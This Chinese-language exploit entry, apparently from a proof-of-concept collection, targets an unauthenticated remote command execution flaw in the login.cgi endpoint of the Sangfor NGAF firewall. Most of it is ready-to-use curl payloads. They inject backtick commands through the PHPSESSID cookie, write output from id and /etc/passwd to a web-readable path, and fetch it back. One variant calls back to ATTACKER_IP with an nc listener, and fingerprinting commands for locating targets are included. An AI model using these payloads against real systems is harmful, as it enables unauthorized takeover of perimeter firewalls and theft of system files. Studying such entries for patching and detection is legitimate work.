---
id: SANGFOR-NGAF-RCE
title: 深信服 NGAF 下一代防火墙 login.cgi 远程命令执行漏洞
product: sangfor-ngaf
vendor: Sangfor (深信服)
version_affected: "深信服 NGAF 下一代防火墙（受影响版本）"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["Sangfor", "深信服", "NGAF", "Redirect.php?url=LogInOut.php"]
---

## 漏洞描述

深信服 NGAF 下一代防火墙的 `login.cgi` 接口在处理登录请求时，将 `PHPSESSID` Cookie 的值直接传递给 shell 执行，未进行任何过滤和转义。攻击者可通过在 Cookie 中注入反引号包裹的命令，实现未经认证的远程命令执行。

## 影响版本

- 深信服 NGAF 下一代防火墙（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/cgi-bin/login.cgi` 接口可达

## 利用步骤

1. 确认目标为深信服 NGAF 下一代防火墙
2. 构造登录请求，在 `PHPSESSID` Cookie 中注入反引号包裹的系统命令
3. 命令执行结果写入 Web 可访问目录（如 `/fwlib/sys/virus/webui/svpn_html/`）
4. 通过 HTTP 请求读取写入的文件，获取命令输出

## Payload

### 命令执行并写入文件

```bash
curl -X POST "http://target/cgi-bin/login.cgi" \
  -H "Content-Type: Application/X-www-Form" \
  -H "Cookie: PHPSESSID=\`$(id > /fwlib/sys/virus/webui/svpn_html/pwned.txt)\`;" \
  -d '{"opr":"login","data":{"user":"test","pwd":"test","vericode":"NSLB","privacy_enable":"0"}}'
```

### 读取命令输出

```bash
curl "http://target/svpn_html/pwned.txt"
```

### 读取 /etc/passwd

```bash
curl -X POST "http://target/cgi-bin/login.cgi" \
  -H "Content-Type: Application/X-www-Form" \
  -H "Cookie: PHPSESSID=\`$(cat /etc/passwd > /fwlib/sys/virus/webui/svpn_html/passwd.txt)\`;" \
  -d '{"opr":"login","data":{"user":"test","pwd":"test","vericode":"NSLB","privacy_enable":"0"}}'
```

```bash
curl "http://target/svpn_html/passwd.txt"
```

### HTTP 回调

```bash
curl -X POST "http://target/cgi-bin/login.cgi" \
  -H "Content-Type: Application/X-www-Form" \
  -H "Cookie: PHPSESSID=\`$(curl http://ATTACKER_IP/callback)\`;" \
  -d '{"opr":"login","data":{"user":"test","pwd":"test","vericode":"NSLB","privacy_enable":"0"}}'
```

## 验证方法

```bash
# 执行命令写入文件后读取
curl -X POST "http://target/cgi-bin/login.cgi" \
  -H "Content-Type: Application/X-www-Form" \
  -H "Cookie: PHPSESSID=\`$(id > /fwlib/sys/virus/webui/svpn_html/pwned.txt)\`;" \
  -d '{"opr":"login","data":{"user":"test","pwd":"test","vericode":"NSLB","privacy_enable":"0"}}'

# 检查写入的文件是否包含 id 输出
curl -s "http://target/svpn_html/pwned.txt" | grep "uid="

# HTTP 回调验证
# 攻击者: nc -lvp 80
curl -X POST "http://target/cgi-bin/login.cgi" \
  -H "Content-Type: Application/X-www-Form" \
  -H "Cookie: PHPSESSID=\`$(curl http://ATTACKER_IP/callback)\`;" \
  -d '{"opr":"login","data":{"user":"test","pwd":"test","vericode":"NSLB","privacy_enable":"0"}}'
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "Sangfor\|深信服\|NGAF\|LogInOut"
curl -s -o /dev/null -w "%{http_code}" "http://target/cgi-bin/login.cgi"
curl -s "http://target/" | grep -i "Redirect.php?url=LogInOut.php"
```
